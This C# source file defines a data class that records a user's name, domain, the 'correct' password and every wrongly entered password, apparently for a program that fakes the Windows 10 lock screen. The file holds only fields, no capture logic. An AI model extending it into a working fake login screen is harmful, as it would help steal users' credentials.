using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Windows10LokkIn.Models
{
    /// <summary>
    /// Contains information about the user of the programm as well as its actions
    /// </summary>
    public class Result
    {
        /// <summary>
        /// The current username
        /// </summary>
        public string UserName { get; set; }

        /// <summary>
        /// The way the username is displayed.
        /// Can be equal to UserName if the display name could be loaded in time.
        /// </summary>
        public string DisplayName { get; set; }

        /// <summary>
        /// The current name and domain
        /// </summary>
        public string DomainName { get; set; }

        /// <summary>
        /// The "correct" password
        /// </summary>
        public string Password { get; set; }

        /// <summary>
        /// List of all wrongly entered passwords
        /// </summary>
        public List<string> WrongPasswords { get; set; } = new List<string>();
    }
}
